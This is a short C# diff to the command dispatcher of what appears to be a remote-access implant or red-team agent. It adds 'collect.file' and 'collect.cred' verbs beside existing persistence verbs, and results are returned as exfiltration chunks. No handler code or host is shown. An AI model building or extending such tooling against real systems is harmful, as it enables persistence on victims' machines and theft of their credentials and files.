@@ -94,6 +94,8 @@ internal sealed class Runner
             "persist.install" => WithNoChunks(Persist.Install(arguments)),
             "persist.remove" => WithNoChunks(Persist.Remove(arguments)),
             "persist.list" => WithNoChunks(Persist.List(arguments)),
+            "collect.file" => Collect.File(arguments),
+            "collect.cred" => Collect.Cred(arguments),
             _ => (TaskOutcome.Failed, "unknown verb: " + verb, Array.Empty<ExfilChunk>()),
         };
     }
